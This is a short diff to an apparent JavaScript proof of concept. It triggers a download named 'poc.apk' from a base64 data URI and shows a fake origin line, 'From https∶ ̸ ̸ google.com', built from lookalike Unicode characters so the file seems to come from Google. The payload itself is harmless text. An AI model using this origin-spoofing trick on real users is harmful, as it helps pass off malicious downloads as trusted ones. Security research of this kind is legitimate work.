@@ -41,11 +41,15 @@
     }
     // Kick off your “exe” download
     function openWin() {
-      Puf(
-        "data:https://google.com/application/x-msdownload;base64,WW91IEhhdmUgQmVlbiBIYWNrZWQ=",
-        "poc.apk\n\n\n\n\n\n\n\nFrom https∶ ̸ ̸ google.com"
-      );
-    }
+  Puf(
+    "data:application/octet-stream;base64,WW91IEhhdmUgQmVlbiBIYWNrZWQ=",
+    "poc.apk"
+  );
+
+  const info = document.createElement("p");
+  info.innerText = "From https∶ ̸ ̸ google.com";
+  document.body.appendChild(info);
+}
     function goFullScreen() {
       const element = document.documentElement;
       if (element.requestFullscreen) {
